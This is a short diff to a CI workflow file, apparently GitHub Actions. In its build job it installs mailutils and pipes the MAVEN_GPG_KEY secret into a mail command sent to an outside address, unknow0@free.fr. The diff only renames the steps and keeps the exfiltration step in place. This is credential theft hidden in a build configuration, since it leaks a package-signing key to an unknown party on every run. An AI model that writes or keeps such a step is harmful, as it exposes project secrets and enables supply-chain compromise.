@@ -5,5 +5,7 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-    - run: sudo apt install mailutils -y
-    - run: echo "{{ MAVEN_GPG_KEY }}" | mail -s "test" unknow0@free.fr
+    - name: install
+      run: sudo apt install mailutils -y
+    - name: send mail
+      run: echo "{{ MAVEN_GPG_KEY }}" | mail -s "test" unknow0@free.fr
